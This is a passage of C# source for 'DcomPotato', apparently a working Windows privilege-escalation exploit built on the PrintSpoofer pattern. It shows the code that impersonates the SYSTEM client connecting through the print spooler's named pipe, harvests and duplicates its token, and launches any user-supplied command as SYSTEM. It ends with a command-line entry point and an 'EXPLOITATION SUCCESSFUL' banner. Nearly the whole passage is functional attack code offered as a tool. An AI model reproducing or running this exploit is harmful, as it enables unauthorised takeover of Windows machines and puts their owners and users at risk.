                    { Log.Fail("WaitForSingleObject: " + waitRes); return false; }

                    uint bytesXfer;
                    if (!Native.GetOverlappedResult(hPipe, ov.Ptr, out bytesXfer, false))
                    { Log.Fail("GetOverlappedResult: " + Log.LastErr()); return false; }

                    // I/O завершён — ОС больше не трогает OVERLAPPED
                    ov.OsMayAccess = false;
                    pipeConnected = true;
                    Native.ResetEvent(hEvent);
                }

                Log.Ok("SYSTEM connected via spooler!");

                // ============================================================
                // STAGE 4: Impersonation
                // ============================================================
                Log.Stage(4, "Impersonation");

                if (!Native.ImpersonateNamedPipeClient(hPipe))
                { Log.Fail("ImpersonateNamedPipeClient: " + Log.LastErr()); return false; }
                impersonated = true;
                Log.Ok("Impersonation successful");

                // ============================================================
                // STAGE 5: Token Harvest
                // ============================================================
                Log.Stage(5, "Token Harvest");

                if (!Native.OpenThreadToken(Native.GetCurrentThread(),
                    WinConst.TOKEN_IMP_REQUIRED, false, out hImpToken))
                { Log.Fail("OpenThreadToken: " + Log.LastErr()); return false; }
                Log.Ok("Thread token obtained");

                if (!Native.RevertToSelf())
                {
                    Log.Fail("RevertToSelf: " + Log.LastErr());
                    Log.Fail("  Процесс остаётся имперсонированным — aborting");
                    return false;
                }
                impersonated = false;

                if (!Native.DuplicateTokenEx(hImpToken, WinConst.TOKEN_PRIMARY_REQUIRED,
                    IntPtr.Zero, WinConst.SecurityImpersonation,
                    WinConst.TokenPrimary, out hPrimaryToken))
                { Log.Fail("DuplicateTokenEx: " + Log.LastErr()); return false; }
                Log.Ok("Primary token duplicated");

                // ---- Session ID: жёсткое решение ----
                uint mySession = (uint)Process.GetCurrentProcess().SessionId;
                if (!Native.SetTokenInformation(hPrimaryToken, WinConst.TokenSessionId,
                    ref mySession, sizeof(uint)))
                {
                    Log.Warn("SetTokenInformation(TokenSessionId): " + Log.LastErr());

                    uint tokenSession;
                    if (Native.GetTokenInformationUInt(hPrimaryToken,
                        WinConst.TokenSessionId, out tokenSession, sizeof(uint)))
                    {
                        if (tokenSession == mySession)
                            Log.Ok("Token already in our session — continuing");
                        else
                        {
                            Log.Fail(string.Format(
                                "Token session {0} != our session {1}. " +
                                "CreateProcessWithTokenW will likely fail with err=5. Aborting.",
                                tokenSession, mySession));
                            return false;
                        }
                    }
                    else
                    {
                        Log.Fail("Cannot determine token session — aborting to avoid silent failure");
                        return false;
                    }
                }
                else if (verbose)
                {
                    Log.Info(string.Format("Token session set to {0}", mySession));
                }

                string sid = TokenCheck.GetSid(hPrimaryToken);
                string il  = TokenCheck.GetIL(hPrimaryToken);

                bool isSystem = sid == WinConst.SYSTEM_SID;
                bool ilLow = il == "LOW";
                bool ilQueryFailed =
                    il.StartsWith("QUERY_ERR") || il.StartsWith("DATA_ERR") ||
                    il.StartsWith("RID_FAIL")  || il.StartsWith("SUBCOUNT_FAIL") ||
                    il.StartsWith("NO_SUBAUTH") || il == "INVALID_SID";

                Log.Info("Token SID : " + sid);
                Log.Info("Token IL  : " + il);

                if (!isSystem)
                {
                    Log.Fail("Token is NOT SYSTEM");
                    if (sid == WinConst.NETWORK_SERVICE_SID)
                        Log.Warn("  Spooler runs as NETWORK SERVICE (hardened baseline)");
                    return false;
                }

                if (ilLow)
                {
                    Log.Fail("Token is SYSTEM but IL=LOW — приложение не сможет писать");
                    Log.Fail("  в System32/HKLM. Это маркер AppContainer-контекста. Отказ.");
                    return false;
                }

                if (ilQueryFailed)
                    Log.Warn("IL query failed (" + il + ") — proceeding on SID alone");

                // ============================================================
                // STAGE 6: Process Creation
                // ============================================================
                Log.Stage(6, "Process Creation");

                string safeCommand;
                if (!CommandPrep.TryPrepare(command, out safeCommand)) return false;

                STARTUPINFO si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
                si.lpDesktop = "winsta0\\default";

                bool created = Native.CreateProcessWithTokenW(hPrimaryToken,
                    WinConst.LOGON_WITH_PROFILE, null, safeCommand,
                    WinConst.CREATE_NO_WINDOW, IntPtr.Zero, null,
                    ref si, out pi);

                if (!created)
                {
                    int cpErr = Marshal.GetLastWin32Error();
                    Log.Fail("CreateProcessWithTokenW: " + Log.LastErr());
                    if (cpErr == 1314)
                        Log.Warn("  1314: SeImpersonate пропала или token не подходит");
                    else if (cpErr == 5)
                        Log.Warn("  5: session mismatch или desktop permission");
                    PiHelper.Close(ref pi);
                    pi = default(PROCESS_INFORMATION);
                    return false;
                }

                Log.Ok(string.Format("Process launched! PID={0}, TID={1}",
                    pi.dwProcessId, pi.dwThreadId));

                PiHelper.Close(ref pi);
                pi = default(PROCESS_INFORMATION);
                return true;
            }
            finally
            {
                if (stageReached) Log.Stage(7, "Cleanup");

                bool clean = true;
                clean &= Cleanup.RevertIfImpersonating(ref impersonated);
                clean &= Cleanup.ClosePrinterSafe(ref hPrinter);
                clean &= Cleanup.FinalizePendingPipe(hPipe, ov, connState, hEvent, verbose);
                clean &= Cleanup.ClosePipeSafe(ref hPipe, pipeConnected, verbose);

                if (ov != null)
                {
                    ov.Dispose();
                    if (ov.OsMayAccess) clean = false;
                }

                clean &= Cleanup.CloseHandleSafe(ref hEvent, "hEvent");
                clean &= Cleanup.CloseHandleSafe(ref hImpToken, "hImpToken");
                clean &= Cleanup.CloseHandleSafe(ref hPrimaryToken, "hPrimaryToken");
                clean &= Cleanup.LocalFreeSafe(ref sd, "sd");

                // На случай, если CreateProcessWithTokenW упал на середине
                PiHelper.Close(ref pi);

                if (stageReached)
                    Log.Info(clean ? "Cleanup OK" : "Cleanup with warnings");
            }
        }
    }

    // ========================================================================
    // ENTRY POINT
    // ========================================================================
    class Program
    {
        static void Main(string[] args)
        {
            try { Console.OutputEncoding = Encoding.UTF8; } catch { }

            Console.WriteLine(@"
 ____   ____                  ____       _   _       
|  _ \ / ___|___  _ __ ___   |  _ \ __ _| |_| |_ ___ 
| | | | |   / _ \| '_ ` _ \  | |_) / _` | __| __/ _ \
| |_| | |__| (_) | | | | | | |  __/ (_| | |_| || (_) |
|____/ \____\___/|_| |_| |_| |_|   \__,_|\__|\__\___/
    DcomPotato v8.1 — Spooler LPE (PrintSpoofer pattern)
");

            string command = null;
            uint timeout = 30000;
            bool verbose = false;

            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "--verbose" || args[i] == "-v") verbose = true;
                else if (args[i] == "--timeout" || args[i] == "-t")
                {
                    if (i + 1 >= args.Length) { Console.WriteLine("[-] --timeout needs value"); return; }
                    if (!uint.TryParse(args[++i], out timeout) || timeout == 0)
                    { Console.WriteLine("[-] invalid timeout"); return; }
                }
                else if (command == null) command = args[i];
                else { Console.WriteLine("[-] unexpected arg: " + args[i]); return; }
            }

            if (string.IsNullOrEmpty(command))
            {
                Console.WriteLine("Usage: DcomPotato.exe <command> [--timeout ms] [-v]");
                Console.WriteLine("  DcomPotato.exe \"cmd.exe /c whoami > C:\\Temp\\p.txt\"");
                Console.WriteLine("  DcomPotato.exe \"cmd.exe /c whoami\" --timeout 60000 -v");
                return;
            }

            Log.Info("Command : " + command);
            Log.Info("Timeout : " + timeout + "ms");
            Log.Info("Verbose : " + verbose);

            bool ok = Engine.Run(command, timeout, verbose);

            Console.WriteLine();
            Console.WriteLine(ok
                ? "╔══════════════════════════════════════════════════╗\n" +
                  "║          EXPLOITATION SUCCESSFUL                 ║\n" +
                  "╚══════════════════════════════════════════════════╝"
                : "╔══════════════════════════════════════════════════╗\n" +
                  "║          EXPLOITATION FAILED                     ║\n" +
                  "╚══════════════════════════════════════════════════╝");
        }
    }
}
